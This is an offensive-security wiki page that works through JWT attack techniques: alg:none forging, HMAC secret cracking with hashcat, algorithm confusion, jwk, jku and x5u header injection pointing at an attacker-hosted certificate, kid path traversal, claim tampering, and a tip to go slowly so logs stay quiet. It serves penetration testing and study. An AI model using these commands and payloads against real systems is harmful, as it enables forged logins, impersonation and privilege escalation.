---
title: JWT Attacks
permalink: /wiki/offsec-notes/concepts/jwt-attacks/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

**Category:** Web / Authentication
**MITRE ATT&CK:** T1550 — Use Alternate Authentication Material; T1078 — Valid Accounts
**Related:** [Web Application Testing](/wiki/offsec-notes/concepts/web-application-testing/), [Xss](/wiki/offsec-notes/concepts/xss/), [Burp Suite](/wiki/offsec-notes/entities/burp-suite/)

## Overview
JSON Web Tokens (JWTs) are the dominant mechanism for stateless session management and API authorization. Flaws in JWT implementation — weak secrets, missing validation, algorithm confusion — allow attackers to forge tokens, impersonate any user, and escalate privileges without knowing a password.

## How It Works

### JWT Structure
Three Base64url-encoded parts separated by periods: `header.payload.signature`
- **Header:** `{"alg":"RS256","typ":"JWT"}` — algorithm and token type
- **Payload:** claims (`sub`, `role`, `exp`, `iat`, any custom fields)
- **Signature:** cryptographic proof the header+payload haven't been tampered with

JWT regex for finding tokens in Burp: `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`

### JWT Types
- **JWS (JSON Web Signature):** Signed, plaintext claims — by far the most common. Header+payload are visible to anyone.
- **JWE (JSON Web Encryption):** Encrypted and signed — rare.

### Signing Algorithms
| Category           | Algorithms          | Key type                               |
| ------------------ | ------------------- | -------------------------------------- |
| Symmetric (HMAC)   | HS256, HS384, HS512 | Single shared secret                   |
| Asymmetric (RSA)   | RS256, RS384, RS512 | Private key signs, public key verifies |
| Asymmetric (ECDSA) | ES256, ES384        | Same public/private model              |

## Attack Methodology

### 1. Reconnaissance
- Identify JWT location: Authorization header (`Bearer`), cookie (`token=`), response body.
- Decode header and payload: `jwt_tool.py <token>` or jwt.io.
- Note `alg`, `exp`, `kid`, `jku`, `x5u` and any privilege/role claims.

### 2. Signature Validation Check
Remove or corrupt the last few characters of the signature. If the server still accepts the request → signature not validated → modify claims freely.

### 3. `alg:none` (Signature Exclusion)
```
# Set alg to none, remove signature (keep trailing period)
header: {"alg":"none","typ":"JWT"}
token: eyJ...header...eyJ...payload...<empty_sig>.
```
Try case variations: `none`, `None`, `NONE`, `nOnE`.
In Burp JWT Editor: Attack → 'none' Signing Algorithm.

### 4. Weak HMAC Secret (HS256)
If `alg` is `HS256/384/512`, the same key signs and verifies. Brute-force offline:
```bash
# jwt_tool
jwt_tool.py <token> -C -d wordlist.txt

# hashcat
hashcat -m 16500 jwt.txt wordlist.txt -r rules/best64.rule
```
If cracked: forge tokens by re-signing with the discovered secret.

### 5. Algorithm Confusion (Key Confusion)
If app uses RS256 (asymmetric), it validates with the **public key**.
Attack: re-sign with HS256 using the **public key as the HMAC secret** → server validates with public key → accepts forged token.
```
# Find public key at common paths:
/.well-known/jwks.json
/api/keys
/certs
/jwks.json
/public.pem

# Burp JWT Editor:
# New RSA Key → paste public key (JWK or PEM)
# Attack → HMAC Key Confusion Attack → select key → OK
# Try both JWK and PEM formats if one fails
```

### 6. JWK Injection
Include attacker-controlled public key in the `jwk` header parameter → server uses it to verify → sign with matching private key.
```
# Burp JWT Editor:
# New RSA Key → Generate → note ID
# Repeater JWT tab → Attack → Embedded JWK → select key → OK
```

### 7. jku / x5u Header Injection
`jku` and `x5u` point to remote URLs where the server fetches public keys.
If not allowlisted, point to attacker-controlled JWKS/PEM endpoint.
```
# Test with Collaborator:
# Repeater JWT tab → Attack → Embed Collaborator Payload → jku or x5u → OK
# If Collaborator receives a callback → server fetches external keys → exploitable

# Exploit: host JWKS at accessible URL, sign token with private key
```

### 8. x5c / x5u Certificate Injection (TrustedSec, 2025)
Two attacks using the `x5c` and `x5u` JWT header parameters to embed or reference X.509 certificates, tricking the server into using an attacker-controlled certificate to verify signature.

**x5c (Embedded Certificate):**
```bash
# Generate self-signed certificate and key
openssl req -newkey rsa:2048 -nodes -keyout attacker.key -x509 -days 365 \
  -out attacker.crt -subj "/CN=attacker"

# Encode cert for x5c header (DER format, base64)
openssl x509 -in attacker.crt -outform DER | base64 -w0

# JWT header: {"alg":"RS256","x5c":["<base64_cert>"],"typ":"JWT"}
# Sign with attacker private key → server uses embedded cert to verify → accepts forged token
```

**x5u (Remote Certificate URL):**
```
# JWT header: {"alg":"RS256","x5u":"https://attacker.com/attacker.crt","typ":"JWT"}
# Server fetches certificate from URL → uses it to verify → sign with matching private key
# Test: set x5u to Collaborator URL first to confirm OOB fetch occurs
```

**Tool:** `JWT_X509_Re-Signer` Burp Extension (Jython required)
- Automates x5c embedding and x5u URL injection
- Handles certificate encoding and JWT re-signing
- github.com — search "JWT_X509_Re-Signer"

**Prerequisite:** Server must not validate certificate chain against a trusted CA — only that the signature matches the cert in the header. This is the common misconfiguration.

### 9. kid (Key ID) Path Traversal
If `kid` parameter is used to load a key from the filesystem without sanitization:
```
# Sign with HS256 using null byte as key (k = "AA==" = Base64 null byte)
# Set kid = "../../../../../../../dev/null"
# Server loads /dev/null (empty) as key → sign token with null byte → accepted

# Burp JWT Editor:
# New Symmetric Key → Generate → replace k with "AA==" → OK
# Repeater JWT tab → set kid = "../../../../dev/null"
# Sign → select HS256 null key → Don't modify header → OK
```

### 10. Claim Tampering
Once you can forge valid tokens (any method above):
- Change `role: "user"` → `role: "admin"`
- Change `sub` or `id` to another user's identifier (IDOR via JWT)
- Remove or extend `exp` to prevent expiry

## Detection & Evasion Notes
- JWT attacks are often silent in logs — no failed auth events.
- Some apps log token validation failures (401s) — go slowly.
- JWTs stored in `localStorage` are vulnerable to XSS theft; `HttpOnly` cookies are not.
- Phishing-resistant MFA doesn't protect against JWT compromise after login.
- Look for interesting non-standard claims: `password`, `totpSecret`, `isAdmin`.

## Tools
- `JWT Editor` (Burp extension) — inline decode, sign, all attacks
- `jwt_tool` — CLI JWT tester with full attack coverage
- `hashcat -m 16500` — HS256/384/512 offline cracking
- jwt.io — quick decode/inspect
- Burp Collaborator — OOB callbacks for jku/x5u detection

## References
- TrustedSec — "Keys to JWT Assessments" (2026-02-05)
- TrustedSec — "Attacking JWT using X509 Certificates" (2025-06-17)
- PortSwigger Web Security Academy — JWT Labs
- RFC 7519 — JSON Web Token
- jwt_tool Attack Methodology — github.com/ticarpi/jwt_tool/wiki/Attack-Methodology
